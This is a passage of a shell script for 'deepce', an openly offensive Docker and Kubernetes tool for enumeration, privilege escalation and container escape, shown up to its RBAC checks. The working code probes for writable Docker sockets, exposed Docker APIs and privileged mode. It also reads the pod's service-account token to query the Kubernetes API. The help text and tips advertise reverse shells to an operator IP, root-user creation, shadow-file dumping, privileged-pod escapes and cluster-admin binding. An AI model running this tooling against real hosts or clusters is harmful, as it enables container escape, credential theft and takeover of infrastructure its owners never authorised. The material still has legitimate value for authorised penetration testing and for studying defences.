#!/bin/sh

# shellcheck disable=SC2034
VERSION="v0.2.0"
ADVISORY="deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."

###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[4m"
EX="${C}[48;5;1m"

banner() {
  if [ "$quiet" ]; then
    return
  fi

  cat <<EOF

$DG                      ##$LG         .
$DG                ## ## ##$LG        ==
$DG             ## ## ## ##$LG       ===
$LG         /"""""""""""""""""\___/ ===
$B    ~~~ $DG{$B~~ ~~~~ ~~~ ~~~~ ~~~ ~$DG /  $LG===-$B ~~~$NC
$DG         \______ X           __/
$DG           \    \         __/
$DG            \____\_______/$NC
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \ $DG  ENUMERATE$NC
   / /_/ /  __/  __/ /_/ / (__/  __/ $DG ESCALATE$NC
   \__,_/\___/\___/ .___/\___/\___/$DG  ESCAPE$NC
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

EOF
}

show_help() {
  cat <<EOF
Usage: ${0##*/} [OPTIONS...]

  -ne,--no-enum          Don't perform enumeration, useful for skipping straight to exploits
  -nn,--no-network       Don't perform any network operations
  -nc,--no-colors        Don't use terminal colors

  --install              Install useful packages before running script, this will maximise enumeration and exploitation potential

  -doc, --delete         Script will delete itself on completion

  ${DG}[Exploits]$NC
  -e, --exploit          Use one of the following exploits (eg. -e SOCK)

    DOCKER               use docker command to create new contains and mount root partition to priv esc
    PRIVILEGED           exploit a container with privileged mode to run commands on the host
    SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc
    CVE-2019-5746
    CVE-2019-5021
    SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host
    K8S_POD              Create privileged pod via Kubernetes API (requires create pods permission)
    K8S_KUBELET          Execute command via unauthenticated kubelet API on port 10250

  ${DG}[Kubernetes Options]$NC
  -k,  --kubernetes      Force Kubernetes enumeration mode
  -km, --k8s-metadata    Check cloud metadata endpoints (AWS/GCP/Azure)
  -ke, --k8s-exploit     Run Kubernetes-specific exploit chains
       --token           Path to service account token (default: /var/run/secrets/kubernetes.io/serviceaccount/token)
       --k8s-api         Override Kubernetes API server URL (default: from KUBERNETES_SERVICE_HOST env)

  ${DG}[Payloads & Options]$NC
  -i, --ip               The local host IP address for reverse shells to connect to
  -p, --port             The port to use for bind or reverse shells
  -l, --listen           Automatically create the reverse shell listener

  -s, --shadow           Print the shadow file as the payload

  -cmd, --command        Run a custom command as the payload

  -x, --payload          Run a custom executable as the payload

  --username             Create a new root user
  --password             Password for new root user

  ${DG}[General Options]$NC
  -q, --quiet            Shhhh, be less verbose
  -h, --help             Display this help and exit.

  [Examples]
  $DG# Exploit docker to get a local shell as root$NC
  ./deepce.sh -e DOCKER

  $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC
  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444

  $DG# Enumerate Kubernetes and check cloud metadata$NC
  ./deepce.sh -k -km

  $DG# Escape via privileged pod creation using K8s SA token$NC
  ./deepce.sh -e K8S_POD -cmd id

EOF
}

###########################################
#--------------) Constants (--------------#
###########################################

# Note we use space separated strings for arrays as sh does not support arrays.
PATH_APPS="/app /usr/src/app /usr/src/myapp /home/node/app /go/src/app /var/www/html /usr/local/tomcat /mosquitto /opt/sonarqube /var/lib/ghost /var/jenkins_home /var/lib/rabbitmq /etc/rabbitmq /var/lib/mysql /usr/local/apache2 /etc/nginx /usr/share /usr/local/etc/redis /etc/traefik /var/lib/postgresql /opt/couchbase"
CONFIG_FILES="/usr/local/apache2/conf/httpd.conf /etc/traefik/traefik.toml /etc/traefik/traefik.yml /etc/mysql/conf.d /etc/mysql/my.cnf /etc/rabbitmq/rabbitmq.config"

GREP_SECRETS="pass\|secret\|key"
GREP_SOCK_INFOS="Architecture\|OSType\|Name\|DockerRootDir\|NCPU\|OperatingSystem\|KernelVersion\|ServerVersion"
GREP_SOCK_INFOS_IGNORE="IndexConfig"
GREP_IGNORE_MOUNTS="/ /\|/cgroup\|/var/lib/docker/\|/null \| proc proc \|/dev/console\|docker.sock"

TIP_NETWORK_ENUM="By default containers can communicate with other containers on the same network and the host machine, this can be used to enumerate further"
TIP_WRITABLE_SOCK="The docker sock is writable, we should be able to enumerate docker, create containers and obtain root privs on the host machine
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-sock.md${NC}"
TIP_DNS_CONTAINER_NAME="Reverse DNS lookup of container name requires host, dig or nslookup to get the container name"
TIP_DOCKER_GROUP="Users in the docker group can escalate to root on the host by mounting the host partition inside the container and chrooting into it.
deepce.sh -e DOCKER
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-group.md${NC}"
TIP_DOCKER_CMD="If we have permission to create new docker containers we can mount the host's root partition and chroot into it and execute commands on the host OS."
TIP_PRIVILEGED_MODE="The container appears to be running in privilege mode, we should be able to access the raw disks and mount the hosts root partition in order to gain code execution.
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-privileged.md${NC}"
TIP_DOCKER_ROOTLESS="In rootless mode privilege escalation to root will not be possible."

TIP_CVE_2019_5021="Alpine linux version 3.3.x-3.5.x accidentally allow users to login as root with a blank password, if we have command execution in the container we can become root using su root"
TIP_CVE_2019_13139="Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when parsing URLs"
TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the runC binary"
TIP_CVE_2025_9074="Docker Desktop versions between 4.25 to 4.44.2 on Windows and MacOS are vulnerable to a container escape via a malicious image. See https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape"

TIP_SYS_MODULE="Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host."

TIP_CVE_2024_21626="runc < 1.1.12 is vulnerable to Leaky Vessels (CVE-2024-21626). Internal file descriptor leak allows accessing host filesystem via /proc/self/fd/. See https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities"
TIP_CVE_2024_23651="BuildKit < 0.12.5 / Docker < 25.0.2 is vulnerable to a build-time mount cache race (CVE-2024-23651) that can allow container escape during image builds."
TIP_CVE_2024_23652="BuildKit < 0.12.5 / Docker < 25.0.2 is vulnerable to arbitrary host file deletion via malicious RUN --mount directives (CVE-2024-23652)."
TIP_CVE_2024_23653="BuildKit < 0.12.5 / Docker Desktop < 4.27.1 is vulnerable to a GRPC privilege check bypass (CVE-2024-23653) allowing build-time container escape via custom Dockerfile syntax."
TIP_CVE_2024_1086="Linux kernel < 6.1.76 / < 6.6.15 is vulnerable to a use-after-free in netfilter nf_tables (CVE-2024-1086). Actively exploited by ransomware groups (RansomHub, Akira) for host escape. See https://github.com/Notselwyn/CVE-2024-1086"
TIP_CVE_2025_31133="runc < 1.2.8 is vulnerable to mount masking bypass (CVE-2025-31133). Symlink via /dev/null allows write access to procfs entries enabling host kernel parameter manipulation."
TIP_CVE_2025_52565="runc < 1.2.8 is vulnerable to /dev/console race condition (CVE-2025-52565). Mount race exploits give write access to /proc/sysrq-trigger on the host."
TIP_CVE_2025_52881="runc < 1.2.8 is vulnerable to LSM relabel bypass (CVE-2025-52881). Race condition allows writes to /proc/sys/kernel/core_pattern for full host escape, bypassing AppArmor and SELinux."

TIP_K8S_SA_TOKEN="Service account token found and API reachable. Enumerate RBAC permissions to identify privilege escalation paths within the cluster."
TIP_K8S_ANON_API="Kubernetes API server accepts anonymous requests. Cluster enumeration possible without credentials."
TIP_K8S_CREATE_PODS="Service account can create pods. Escape to the node by creating a privileged pod with a hostPath / mount.
deepce.sh -e K8S_POD -cmd id
See https://bishopfox.com/blog/kubernetes-pod-privilege-escalation"
TIP_K8S_KUBELET="Unauthenticated kubelet API (port 10250) detected. List pods and execute commands in any container on this node without audit logging.
deepce.sh -e K8S_KUBELET -cmd id
See https://www.aquasec.com/blog/kubernetes-exposed-exploiting-the-kubelet-api/"
TIP_K8S_ETCD="Unauthenticated etcd access is equivalent to cluster-admin. All cluster secrets, RBAC policies, and SA tokens are readable and writable."
TIP_K8S_METADATA="Cloud instance metadata is accessible from this pod. IAM credentials and service account tokens may be extractable for cloud infrastructure compromise."
TIP_K8S_HOSTPATH="Sensitive host path mounts detected. Host filesystem access may allow reading node credentials, kubeconfig, or kubelet certificates."
TIP_K8S_ESCALATE="Service account has 'escalate' or 'bind' permission. Bind current SA to cluster-admin ClusterRole for full cluster control."
TIP_K8S_SECRETS="Service account can list secrets cluster-wide. This may expose credentials, image pull secrets, and other service account tokens."

SA_TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
SA_CA_PATH="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
SA_NS_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"

DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override\|cap_sys_rawio\|cap_mknod"

CONTAINER_CMDS="docker lxc rkt kubectl podman crictl"
USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"

###########################################
#---------------) Helpers (---------------#
###########################################

# Convert version numbers into a regular number so we can do simple comparisons (use floats because sh can interpret 0 prefix numbers incorrectly otherwise).
# shellcheck disable=SC2046
# shellcheck disable=SC2183 # word splitting here is on purpose
ver() { printf "%03.0f%03.0f%03.0f" $(echo "$1" | tr '.' ' ' | cut -d '-' -f1); }

getRuncVersion() {
  runcVersion=""
  if [ -x "$(command -v runc)" ]; then
    runcVersion=$(runc --version 2>/dev/null | head -n1 | grep -o '[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*' | head -n1)
  fi
  # Fall back: parse from containerd output
  if [ -z "$runcVersion" ] && [ -x "$(command -v containerd)" ]; then
    runcVersion=$(containerd --version 2>/dev/null | grep -o 'runc [0-9.]*' | cut -d' ' -f2)
  fi
}

getContainerRuntime() {
  containerRuntime="unknown"
  if [ -S "/var/run/crio/crio.sock" ]; then
    containerRuntime="cri-o"
  fi
  if [ -S "/run/containerd/containerd.sock" ] || [ -S "/var/run/containerd/containerd.sock" ]; then
    containerRuntime="containerd"
  fi
  if [ -S "/var/run/docker.sock" ] || [ -x "$(command -v docker)" ]; then
    containerRuntime="docker"
  fi
  printResult "Container Runtime ......." "$containerRuntime" "Unknown"
}

###########################################
#--------------) Printing (---------------#
###########################################

printer() {
  # Only print if not empty
  if [ "$2" ]; then
    # Temporarily replace the IFS with null to preserve newline chars
    OLDIFS=$IFS
    IFS=
    printf "%s%s%s\n" "$1" "$2" "$NC"
    # Restore it so we don't break anything else
    IFS=$OLDIFS
  fi
}

printSection() {
  # Print a section like:
  # ========================================( Title here )========================================
  l=94
  if [ "$1" ]; then
    s="( $1 )"
  else
    s="$1"
  fi
  size=${#s}
  no=$((l-size))
  start=$((no/2))
  end=$((no-start))
  printf "%s%${start}s" "$B" | tr " " "="
  printf "%s%s%s" "$GREEN" "$s" "$B"
  printf "%${end}s" | tr " " "="
  printf "%s\n" "$NC"
}

printEx() { printer "$EX" "$1"; }
printFail() { printer "$DG" "$1"; }
printInfo() { printer "$LG" "$1"; }
printError() { printer "$RED" "$1"; }
printSuccess() { printer "$Y" "$1"; }
printQuestion() { printf "%s[+]%s %s %s" "$Y" "$GREEN" "$1" "$NC"; }
printStatus() { printer "$DG" "$1"; }
printYesEx() { printEx Yes; }
printYes() { printSuccess Yes; }
printNo() { printFail No; }
TODO() { printError "${NC}TODO $1"; }
nl() { echo ""; }

printTip() {
  if [ "$quiet" ]; then
    return
  fi
    printer "$DG" "$1" | fold -s -w 95
  nl
}

printResult() {
  printQuestion "$1"
  if [ "$2" ]; then
    printSuccess "$2"
  else
    if [ "$3" ]; then
      printError "$3"
    else
      printNo
    fi
  fi
}

printResultLong() {
  printQuestion "$1"
  if [ "$2" ]; then
    printYes
    printStatus "$2"
  else
    if [ "$3" ]; then
      printError "$3"
    else
      printNo
    fi
  fi
}

printMsg() {
  printQuestion "$1"
  printFail "$2"
}

printInstallAdvice() {
  printError "$1 is required but not installed"
  # TODO: Test install options
  # TODO: Rename some with correct package names
  if [ -x "$(command -v apt)" ]; then
    # Debian based OSes
    # TODO dig / nslookup / host -> dnsutils
    printError "apt install -y $1"
  elif [ -x "$(command -v apk)" ]; then
    # Alpine
    # TODO: dig / nslookup -> bind-tools
    printError "apk add $1"
  elif [ -x "$(command -v yum)" ]; then
    # CentOS / Fedora
    # TODO: dig / nslookup -> bind-utils
    printError "yum install $1"
  elif [ -x "$(command -v apt-get)" ]; then
    # Old Debian
    # TODO dig / nslookup / host -> dnsutils
    printError "apt-get install -y $1"
  fi
  nl
}

installPackages() {
  if ! [ "$install" ]; then
    return
  fi

  if ! [ "$(id -u)" = 0 ]; then
    # TODO: Elevate via sudo
    printError "Need to be root to install packages..."
    return
  fi

  printSection "Installing Packages"
  if [ -x "$(command -v apt)" ]; then
    # Debian based OSes
    printQuestion "Installing Packages ....."

    export DEBIAN_FRONTEND=noninteractive
    if ! [ "$(apt update 2>/dev/null)" ]; then #
        printError "Failed"
        return
    fi

    if apt install --no-install-recommends --force-yes -y dnsutils curl nmap iputils-ping libcap2-bin >/dev/null 2>&1; then
        printSuccess "Success"
    else
        printError "Failed"
    fi

  elif [ -x "$(command -v apk)" ]; then
    # Alpine
    apk add bind-tools curl nmap libcap
  elif [ -x "$(command -v yum)" ]; then
    # CentOS / Fedora
    yum install bind-utils curl nmap libcap
  elif [ -x "$(command -v apt-get)" ]; then
    # Old Debian
    apt-get install -y dnsutils curl nmap inetutils-ping libcap2-bin
  fi
}

unsetColors(){
  RED=""
  GREEN=""
  Y=""
  B=""
  LG=""
  DG=""
  NC=""
  UNDERLINED=""
  EX=""
}

describeColors(){
  # Describe the colors unless they have been unset or we're being quiet
  if [ "$quiet" ] || ! [ "$RED" ]; then
    return
  fi
  printSection "Colors"
  printQuestion "Exploit Test ............"; printEx "Exploitable - Check this out";
  printResult "Basic Test .............." "Positive Result"
  printResult "Another Test ............" "" "Error running check"
  printQuestion "Negative Test ..........."; printNo;
  printResultLong "Multi line test ........." "Command output
spanning multiple lines"
  nl
  printTip "Tips will look like this and often contains links with additional info. You can usually ctrl+click links in modern terminal to open in a browser window
See ${UNDERLINED}https://stealthcopter.github.io/deepce${NC}"
}

###########################################
#---------------) Checks (----------------#
###########################################

containerCheck() {
  inContainer=""

  # Docker: .dockerenv marker
  if [ -f "/.dockerenv" ]; then
    inContainer="1"
    containerType="docker"
  fi

  # Docker: cgroup check
  if grep "/docker/" /proc/1/cgroup -qa 2>/dev/null; then
    inContainer="1"
    containerType="docker"
  fi

  # Kubernetes: KUBERNETES_SERVICE_HOST is always set in pods (most reliable)
  if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
    inContainer="1"
    containerType="kubernetes"
  fi

  # Kubernetes: service account secrets directory
  if [ -d "/var/run/secrets/kubernetes.io" ]; then
    inContainer="1"
    containerType="kubernetes"
  fi

  # Kubernetes: cgroup patterns (kubepods for cgroup v1, system.slice/kube for cgroup v2)
  if grep -q "kubepod\|/kube" /proc/1/cgroup 2>/dev/null; then
    inContainer="1"
    containerType="kubernetes"
  fi

  # Force Kubernetes mode via flag
  if [ "$forceKubernetes" ]; then
    inContainer="1"
    containerType="kubernetes"
  fi

  # LXC
  if env | grep "container=lxc" -qa 2>/dev/null; then
    inContainer="1"
    containerType="lxc"
  fi
  if grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then
    inContainer="1"
    containerType="lxc"
  fi
}

containerType() {
  printResult "Container Platform ......" "$containerType" "Unknown"
}

userCheck() {
  printQuestion "User ...................."
  if [ "$(id -u)" = 0 ]; then
    isUserRoot="1"
    printEx "root"
  else
    printSuccess "$(whoami)"
  fi

  printQuestion "Groups .................."
  groups=$(groups| sed "s/\($DANGEROUS_GROUPS\)/${LG}${EX}&${NC}${DG}/g")
  printStatus "$groups" "None"

  if ! [ "$isUserRoot" ]; then
    printQuestion "Sudo ...................."
    if [ -x "$(command -v sudo)" ]; then
      if sudo -n -l 2>/dev/null; then
        printEx "Passwordless Sudo"
        isUserHasSudo="1"
      else
        printError "Password required"
      fi
    else
      printError "sudo not found"
    fi
  else
    printQuestion "Sudoers ................."
    if [ -r /etc/sudoers ]; then
      sudoers=$(grep -v "#\|^$\|^Defaults\|@include" /etc/sudoers)
      printYes
      printStatus "$sudoers"
    else
      printNo
    fi
  fi
}

dockerSockCheck() {
  # Is the docker sock exposed
  printQuestion "Docker Sock ............."
  dockerSockPath=""
  if [ -S "/var/run/docker.sock" ]; then
    dockerSockPath="/var/run/docker.sock"
    printYes
  else
    printFail "Not Found"
    # TODO: Search elsewhere for sock?
  fi

  if [ "$dockerSockPath" ]; then

    printInfo "$(ls -lah $dockerSockPath)"

    # Is docker sock writable
    printQuestion "Sock is writable ........"
    if test -r "$dockerSockPath"; then
      printYesEx
      printTip "$TIP_WRITABLE_SOCK"
      if [ -x "$(command -v curl)" ]; then
        sockInfoCmd="curl -s --unix-socket $dockerSockPath http://localhost/info"
        sockInfoRepsonse="$($sockInfoCmd)"

        printTip "To see full info from the docker sock output run the following"
        printStatus "$sockInfoCmd"
        nl

        # Docker version unknown lets get it from the sock
        if [ -z "$dockerVersion" ]; then
          # IF jq...
          #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
          dockerVersion=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
        fi

        # Get info from sock
        info=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')

        printInfo "$info"
      else
        printError "Could not interact with the docker sock, as curl is not installed"
        printInstallAdvice "curl"
      fi
    else
      printNo
    fi
  fi
}

enumerateContainer() {
  printSection "Enumerating Container"
  containerID
  containerName
  containerIPs
  getContainerInformation
  containerCapabilities
  containerServices
  containerPrivileges
  containerExploits
}

containerID() {
  # Get container ID
  containerID="$(cat /etc/hostname || uname -n || hostname)"
  # Get container full ID
  printResult "Container ID ............" "$containerID" "Unknown"

  if [ "$containerType" = "docker" ]; then
    containerFullID=$(basename "$(cat /proc/1/cpuset)")
    printResult "Container Full ID ......." "$containerFullID" "Unknown"
  fi
}

containerIPs() {
  sleep 2

  # Get container IP
  if [ -x "$(command -v hostname)" ]; then
    containerIP="$(hostname -I 2>/dev/null || hostname -i)"
  elif [ -x "$(command -v ip)" ]; then
    containerIP="$(ip route get 1 | head -1 | cut -d' ' -f7)" # FIXME: Use sed as fields are inconsistent
  fi

  printResult "Container IP ............" "$containerIP" "Could not find IP"

  # Container DNS
  dnsServers=$(grep "nameserver" /etc/resolv.conf | cut -d' ' -f2 | tr '\n' ' ')
  printResult "DNS Server(s) ..........." "$dnsServers" "Could not find DNS Servers"

  # Host IP
  if [ -x "$(command -v netstat)" ]; then
    hostIP="$(netstat -nr | grep '^0\.0\.0\.0' | awk '{print $2}')"
  elif [ -x "$(command -v ip)" ]; then
    hostIP="$(ip route get 1 | cut -d' ' -f 3)"
  elif [ "$containerIP" ]; then
    # No tools available, just have a guess
    hostIP=$(echo "$containerIP" | cut -d'.' -f 1-3).1
  fi

  printResult "Host IP ................." "$hostIP" "Could not find Host IP"
}

containerTools(){
  for CMD in ${CONTAINER_CMDS}; do
    tools="$tools $(command -v "${CMD}")"
  done
  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n'| grep -v '^$')" "None"
}

containerName() {
  # Get container name
  # host, dig, nslookup

  if [ "$containerType" = "docker" ]; then
    # Requires containerIP
    if [ "$containerIP" ]; then
        if [ -x "$(command -v host)" ]; then
          containerName=$(host "$containerIP" | rev | cut -d' ' -f1 | rev)
        elif [ -x "$(command -v dig)" ]; then
          containerName=$(dig -x "$containerIP" +noall +answer | grep 'PTR' | rev | cut -f1 | rev)
        elif [ -x "$(command -v nslookup)" ]; then
          containerName=$(nslookup "$containerIP" 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)
        else
          missingTools="1"
        fi
    fi
  else
    containerName=$containerID
  fi

  printQuestion "Container Name .........."
  if [ "$containerName" ]; then
    printSuccess "$containerName"
  else
    printError "Could not get container name through reverse DNS"
    if [ "$missingTools" ]; then
      printTip "$TIP_DNS_CONTAINER_NAME"
      printInstallAdvice "host dig nslookup"
    fi
  fi
}

getContainerInformation() {
  # Enumerate container info

  if [ -x "$(command -v lsb_release)" ]; then
    os="$(lsb_release -i | cut -f2)"
  else
    os="$(uname -o)"
  fi

  kernelVersion=$(uname -r)
  arch=$(uname -m)
  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2| cut -d' ' -f2-)

  printMsg "Operating System ........" "$os"
  printMsg "Kernel .................." "$kernelVersion"
  printMsg "Arch ...................." "$arch"
  printMsg "CPU ....................." "$cpuModel"

  for CMD in ${USEFUL_CMDS}; do
    tools="$tools $(command -v "${CMD}")"
  done

  # shellcheck disable=SC2086 # Double quotes messes up output...
  printResultLong "Useful tools installed .." "$(echo $tools | tr ' ' '\n')"
}

containerCapabilities() {
  printQuestion "Dangerous Capabilities .."
  if [ -x "$(command -v capsh)" ]; then
    if capsh --print| grep -q "$DANGEROUS_CAPABILITIES"; then
        caps=$(capsh --print |grep 'cap_' | sed "s/\($DANGEROUS_CAPABILITIES\)/${LG}${EX}&${NC}${DG}/g")
        printYes
        printStatus "$caps"
    else
        printNo
    fi
  else
    caps=$(grep Cap /proc/self/status)
    capEff=$(grep CapEff /proc/self/status | cut -d ':' -f 2 | tr -d '\t')
    printError "capsh not installed, listing raw capabilities"
    printInstallAdvice "libcap2-bin"
    printStatus "Current capabilities are:"
    printStatus "$caps"
    printStatus "> This can be decoded with: \"capsh --decode=${capEff}\""
  fi
}

containerServices() {
  # SSHD

  printQuestion "SSHD Service ............"

  if ! [ -x "$(command -v ps)" ]; then
    printError "Unknown (ps not installed)"
    return
  fi

  (ps -aux 2>/dev/null || ps -a) | grep -v "grep" | grep -q "sshd"

  # shellcheck disable=SC2181
  if [ $? -eq 0 ]; then
    if [ -f "/etc/ssh/sshd_config" ]; then
      sshPort=$(grep "^Port" /etc/ssh/sshd_config || echo "Port 22" | cut -d' ' -f2)
      printSuccess "Yes (port $sshPort)"
    else
      printSuccess "Yes"
    fi
  else
    printNo
  fi
}

containerPrivileges() {
  printQuestion "Privileged Mode ........."
  if [ -x "$(command -v fdisk)" ]; then
    if [ "$(fdisk -l 2>/dev/null | wc -l)" -gt 0 ]; then
      printYesEx
      printTip "$TIP_PRIVILEGED_MODE"
    else
      printNo
    fi
  else
    printError "Unknown"
  fi
}

containerExploitAlpine() {
  # If we are on an alpine linux disto check for CVE–2019–5021
  if [ -f "/etc/alpine-release" ]; then
    alpineVersion=$(cat /etc/alpine-release)
    printQuestion "Alpine Linux Version ...."
    printSuccess "$alpineVersion"
    printQuestion "└── CVE-2019-5021 ......."

    if [ "$(ver "$alpineVersion")" -ge "$(ver 3.3.0)" ] && [ "$(ver "$alpineVersion")" -le "$(ver 3.6.0)" ]; then
      printYesEx
      printTip "$TIP_CVE_2019_5021"
    else
      printNo
    fi
  fi
}

containerExploitAPI() {
  # Check if docker api is exposed (including CVE-2025-9074)
  api_available="0"
  api_host=""
  api_hosts="192.168.65.7:2375 172.17.0.1:2375"

  printQuestion "Docker API exposed ......"

  if [ -x "$(command -v curl)" ] || [ -x "$(command -v wget)" ]; then
    for host in $api_hosts; do
      if [ -x "$(command -v curl)" ]; then
        if curl -s --connect-timeout 1 "http://$host/version" >/dev/null 2>&1; then
          api_available="1"
          api_host="$host"
          break
        fi
      else
        if wget -O - "http://$host/version" --connect-timeout=1 --tries=1 -q >/dev/null 2>&1; then
          api_available="1"
          api_host="$host"
          break
        fi
      fi
    done

    if [ "$api_available" = "0" ]; then
      printNo
      return
    fi

    printSuccess "Yes ($api_host)"
    printQuestion "└── CVE-2025-9074 ......."

    if [ -x "$(command -v curl)" ]; then
      if curl -s --connect-timeout 1 "http://$api_host/containers/json" >/dev/null 2>&1; then
        printYesEx
        printTip "$TIP_CVE_2025_9074"
      else
        printNo
      fi
    elif wget -O - "http://$api_host/containers/json" --connect-timeout=1 --tries=1 -q >/dev/null 2>&1; then
        printYesEx
        printTip "$TIP_CVE_2025_9074"
    else
      printNo
    fi
  else
    printError "Unknown (curl/wget not installed)"
  fi
}

containerExploits() {
  containerExploitAlpine
  containerExploitAPI
}

###########################################
#-----------) Kubernetes Checks (----------#
###########################################

checkServiceAccount() {
  printSection "Kubernetes Service Account"

  # Allow operator to override token path
  saToken="${k8sToken:-$SA_TOKEN_PATH}"

  printQuestion "SA token present ........"
  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
    printYesEx
    k8sTokenData=$(cat "$saToken" 2>/dev/null)

    # Decode JWT exp field without crypto (base64 decode middle segment)
    jwtPayload=$(echo "$k8sTokenData" | cut -d'.' -f2)
    # Pad base64 for decoding
    padded=$(printf '%s' "$jwtPayload" | awk '{n=length($0)%4; if(n==2) printf "%s==",  $0; else if(n==3) printf "%s=", $0; else printf "%s", $0}')
    tokenExp=$(printf '%s' "$padded" | base64 -d 2>/dev/null | grep -o '"exp":[0-9]*' | cut -d':' -f2)
    if [ "$tokenExp" ]; then
      printStatus "Token exp: $tokenExp (unix timestamp)"
    fi
  else
    printNo
    return
  fi

  printQuestion "SA namespace ............"
  if [ -f "$SA_NS_PATH" ]; then
    k8sNamespace=$(cat "$SA_NS_PATH" 2>/dev/null)
    printSuccess "$k8sNamespace"
  else
    k8sNamespace="default"
    printFail "Not found, assuming: $k8sNamespace"
  fi

  printQuestion "SA CA cert present ......"
  if [ -f "$SA_CA_PATH" ]; then
    printYes
    curl_ca="--cacert $SA_CA_PATH"
  else
    printNo
    curl_ca="-k"
  fi

  printTip "$TIP_K8S_SA_TOKEN"
}

checkK8sAPIServer() {
  printSection "Kubernetes API Server"

  # Build API base URL
  if [ "$k8sAPIOverride" ]; then
    k8sAPI="$k8sAPIOverride"
  elif [ "$KUBERNETES_SERVICE_HOST" ]; then
    k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
    k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
  else
    printFail "KUBERNETES_SERVICE_HOST not set, cannot determine API URL"
    return
  fi

  printResult "API Server URL .........." "$k8sAPI"

  if ! [ -x "$(command -v curl)" ]; then
    printError "curl required for K8s API checks"
    return
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  # shellcheck disable=SC2086
  authHeader=""
  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
    authHeader="-H \"Authorization: Bearer $(cat "$saToken")\""
  fi

  # Test anonymous access
  printQuestion "Anonymous API access ...."
  # shellcheck disable=SC2086
  anonResp=$(curl -s $curl_ca --connect-timeout 3 "$k8sAPI/api/v1" 2>/dev/null | head -c 200)
  if echo "$anonResp" | grep -q '"kind"'; then
    printYesEx
    printTip "$TIP_K8S_ANON_API"
    k8sAnonAccess="1"
  else
    printNo
  fi

  # Test authenticated access
  printQuestion "Authenticated API access "
  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
    # shellcheck disable=SC2086
    authResp=$(curl -s $curl_ca --connect-timeout 3 -H "Authorization: Bearer $(cat "$saToken")" "$k8sAPI/api/v1/namespaces" 2>/dev/null | head -c 200)
    if echo "$authResp" | grep -q '"kind"'; then
      printYesEx
      k8sAuthAccess="1"
    else
      printNo
    fi
  else
    printFail "No SA token"
  fi

  # Get K8s version
  printQuestion "Kubernetes version ......"
  # shellcheck disable=SC2086
  k8sVer=$(curl -s $curl_ca --connect-timeout 3 "$k8sAPI/version" 2>/dev/null | grep -o '"gitVersion":"[^"]*' | cut -d'"' -f4)
  if [ "$k8sVer" ]; then
    printSuccess "$k8sVer"
  else
    printNo
  fi
}

checkK8sRBAC() {
  printSection "Kubernetes RBAC Permissions"

  if ! [ -x "$(command -v curl)" ]; then
    return
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
    printFail "No SA token — skipping RBAC checks"
    return
  fi

  if ! [ "$k8sAPI" ]; then
    if [ "$KUBERNETES_SERVICE_HOST" ]; then
      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
    else
      return
    fi
  fi

  tokenData=$(cat "$saToken")
  # shellcheck disable=SC2086

  # Helper: selfsubjectaccessreview for a given verb/resource/group
  canI() {
    _verb="$1"; _resource="$2"; _group="${3:-}"
    _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"${k8sNamespace:-default}\",\"verb\":\"$_verb\",\"resource\":\"$_resource\",\"group\":\"$_group\"}}}"
    _resp=$(curl -s $curl_ca --connect-timeout 3 \
      -X POST \
      -H "Authorization: Bearer $tokenData" \
      -H "Content-Type: application/json" \
      -d "$_body" \
      "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
    echo "$_resp" | grep -q '"allowed":true'
  }

  # Check high-value permissions
  printQuestion "Can create pods ........."
  if canI create pods; then
    printYesEx
    k8sCanCreatePods="1"
